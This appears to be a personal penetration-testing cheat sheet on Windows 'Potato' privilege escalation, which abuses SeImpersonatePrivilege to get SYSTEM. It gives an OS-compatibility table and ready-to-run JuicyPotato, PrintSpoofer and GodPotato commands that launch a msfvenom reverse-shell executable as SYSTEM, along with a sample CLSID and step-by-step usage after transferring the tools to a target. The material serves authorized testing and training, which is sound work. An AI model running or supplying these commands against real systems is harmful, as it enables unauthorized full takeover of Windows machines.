## Potato Attacks — SeImpersonate → SYSTEM

→ A family of local-privesc tools that abuse **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`** (check with `whoami /priv`). They coerce a SYSTEM process to authenticate to a pipe/COM object you control, steal its token, and run a command **as SYSTEM**. 
**How you use it:** each Potato is a precompiled **`.exe` you transfer to the target** (see [[File_Transfer]] — certutil / SMB / UNC), then run from your existing shell. It launches your payload (a cmd, or a msfvenom `revshell.exe`) as SYSTEM. **Start your listener first.**

---

## Which Potato for which OS (pick by `ver` / `systeminfo`)

| Tool                           | Works on                                                                | Broken / not for                                | Trigger                                            |
| ------------------------------ | ----------------------------------------------------------------------- | ----------------------------------------------- | -------------------------------------------------- |
| **JuicyPotato**                | Win7/8/10 (pre-1809), **Server 2008 / 2008 R2 / 2012 / 2012 R2 / 2016** | Win10 1809+ / Server 2019+ (DCOM trick patched) | DCOM/BITS — needs a valid **CLSID** for the OS     |
| **RottenPotato / PotatoNG**    | Server 2008 / 2012 era (old)                                            | superseded by JuicyPotato                       | DCOM/NTLM relay                                    |
| **PrintSpoofer**               | **Win10/11, Server 2016 / 2019 / 2022**                                 | old 2008 (spooler differs)                      | Print Spooler named pipe (spooler must be running) |
| **GodPotato**                  | **Server 2012 – 2022, Win8 – 11** (wide modern all-rounder)             | Server 2008 (needs newer .NET/DCOM)             | DCOM/RPC — needs .NET 3.5+                         |
| **RoguePotato**                | Win10 1809+ / Server 2019+                                              | pre-1809                                        | OXID resolver — needs a network redirector         |
| **EfsPotato / SharpEfsPotato** | Server 2016 / 2019 / 2022                                               | —                                               | MS-EFSR pipe                                       |
| **SweetPotato**                | bundles several (auto-picks)                                            | —                                               | tries multiple triggers                            |

**Quick rule:**
- **Old box (2008 / 2012 / 2016)** → **JuicyPotato**
- **Modern box (2019 / 2022 / Win10 1809+ / 11)** → **PrintSpoofer** first, then **GodPotato** / RoguePotato

---

## JuicyPotato (old Windows — 2008 / 2012 / 2016)

```cmd
JuicyPotato.exe -l 1337 -p C:\wamp\www\revshell.exe -t * -c {CLSID}
```
→ `-l` COM listen port (any free port) · `-p` program to run as SYSTEM · `-t *` try both CreateProcess methods · `-c` a **CLSID valid for this OS**.

**CLSID list:** `http://ohpe.it/juicy-potato/CLSID/` — pick one matching the exact OS. Common 2008/generic BITS CLSID: `{4991d34b-80a1-4291-83b6-3328366b9097}`. If one returns a COM error, try another from the list.

> Confirm with `whoami` → `nt authority\system`. Point `-p` at a msfvenom `revshell.exe` (or `-p C:\Windows\System32\cmd.exe -a "/c <cmd>"`).

---

## PrintSpoofer (modern — 2016 / 2019 / Win10+)

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer64.exe -c "C:\Users\Public\revshell.exe"
```
→ `-i` interact with the spawned process · `-c` command/exe to run as SYSTEM. Needs the **Print Spooler** service running.

## GodPotato (modern all-rounder — 2012–2022)

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Users\Public\revshell.exe"
```
→ Match the `-NET2` / `-NET4` build to the installed .NET version. Reliable when PrintSpoofer's spooler trick is blocked.

---

## Related Notes

- [[Windows_Priv_Esc]] — full privesc order of operations (SeImpersonate section)
- [[File_Transfer]] — getting the .exe onto the target
- [[Msfvenom]] — build the SYSTEM payload the Potato runs
- [[ReverseShells]]
